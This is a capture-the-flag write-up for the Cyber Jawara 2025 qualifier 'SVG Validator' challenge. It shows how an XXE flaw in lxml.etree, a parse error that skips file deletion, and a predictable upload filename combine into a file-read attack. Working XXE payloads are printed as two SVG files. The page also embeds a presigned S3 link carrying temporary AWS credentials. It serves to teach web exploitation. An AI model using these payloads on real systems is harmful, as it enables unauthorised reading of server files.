---
id: 17948583-e65d-8037-bf0f-d573b2499823
title: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
created_time: 2025-01-12T10:59:00.000Z
last_edited_time: 2025-05-22T09:16:00.000Z
cover_image: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif
icon_emoji: 🫡
categories:
  - XXE
verification:
  state: unverified
  verified_by: null
  date: null
page: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif

---

# Description

A simple SVG validator.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/8d6a70b2-6c3c-410a-9ddb-5303e731a08d/svg-validator.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB46656WCZ4D5%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T095012Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDEaCXVzLXdlc3QtMiJIMEYCIQDUHyAFdkKA5qMZJUe%2BUnDjGR6VJK8N2z9cGoZ0wxXVnAIhAKUDNsqwAuKr8MaLe5f31%2FX8chJHEkTy%2FDSZFRFncAZTKogECOr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igw8b2t1MO21TIaSejcq3AOiFmPhRcQVcL0lkWMzCBImAPCpaF1SZ%2B5Po4%2FjBYqrgP1VKMSW9OQrrL8vM2sjnI5eyHL%2Fe9udCk87sAhCol%2BlDaw1pCLGBwV%2FQOufNAIPBR7eoGbOEYQP2PqrFtDxbTYWEpAAqeoqFPonW1zJfK9Sz1wzxJufwSsBJZ48rbajtl3gH2uQ4oyYv32VULDbQAA8QiyJuEekpZ7KOgrGlqv%2BUQAic8lKSt8iNWBh3s3Y6hUnN92cVSUP0j%2BZxNAzL2zhPOxPo1zvdR0ccMiiCA8T7aKFTtx6ZlOyWELDXiPTCLoTMHj6sfXQr4YA7tDd2j0aX851XV%2BnohKx3IuVvJszg4ixAuTCTIf%2Fv6TManBUV8wq1XAtTv0oQy9YLDOYrdz%2BetrtJUTAnzGpwuEnMSh%2BhG4RaikID6ISzagEGiM%2FvvozeHUoel5Uy5shU0bHNsijlz%2BsfAZB2QSYxapq82SnwzEZu6%2FA5tzQK9ILvVXhb74Rln4%2BdD3UX3ua0aLyWTmuPdv1YdGiwJqppnZJC02jmOADwaB%2B19TW5uAGsb5DEh%2FU63uzM%2BjqdU72tVYg4HSFzYsYynDeYijy8xR3O9YPBwbLEtp%2F%2F%2BGjO2Hs%2F2OEDX2DgIL9H2iihZSNizC48cDBBjqkAdx3SGS7dJfJuE%2FVWar7MyX8SStwsoUDRJMZpFQS9JdXJTqz9HnIC0t0%2F4EVoGEH5uXjoaK8MzCGlvAo8LkSe%2B0DuNyJUpd3LJE3DiYe84XpEnaciHgsxka4WqK5%2BPRDkrS4bQfwiir3kOVo7i4ql9jh0FxwbaEEbou4JRRna2a7EhDFQJ1DoEd3CNDOVUNO0sinCQDJtXXiYZ%2Bmxeus%2BJ9KGZoj\&X-Amz-Signature=d46e5216d56c79f50eb36e013f0448f4a15f0bdacb3d852de1aa55e36217d33b\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# Exploit

In order to gain Arbitrary File Read, we will exploit the XXE vulnerability in the `lxml.etree`. We must introduce an error in the XML since we cannot read the flag information directly because we do not receive the rendered XML's direct output.

For this task, we have to save our local file on the server, but we can't because it will be deleted after validation. However, we can store and get around the `os.remove` due of a logical error:

```python
        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

Therefore, by making the `is_valid_svg` function throw an error, we can avoid the `os.remove` step and ensure that the file stored on the server will remain intact even if our `is_valid_svg` method gives an error.

```python
def is_valid_svg(file_path):
    tree = etree.parse(file_path)
    root = tree.getroot()
    return root.tag.endswith('svg')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    if not allowed_file(file.filename):
        return jsonify({'error': 'Invalid file extension'}), 400

    file_path = ''

    try:
        extension = file.filename.rsplit('.', 1)[1].lower()

        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)

        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

We now need to keep one XML file on the server so that we can add it later to cause an error that will leak the flag. This is the first file we upload:

testing.svg

```python
<!ENTITY % content SYSTEM "file://app/flag.txt">
	<!ENTITY % test '<!ENTITY &#x25; file SYSTEM "file:///tmp/%content;">'>
 	%test;
```

due to the etree.Parse will automatically avoid the os.remove function and throw an error since it does not recognize this as valid XML. The second file is as follows:

file.svg

```python
<!DOCTYPE root [
	<!ENTITY % dtd SYSTEM "file:///tmp/051880fbfbd0b3f38ec3244610784c3a9c258f755039bb7cf1311fd1fc843f2d.svg">
 	%dtd;
]>
<svg></svg>
```

The file in tmp is a file that we upload before, the hash isn’t random and same each iteration because their filename isn’t use secret.token\_hex function properly:

```python
        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
```

So after we uploaded that two file we will get the flag:

![](./imgs/image_UQYv5eO4.png)
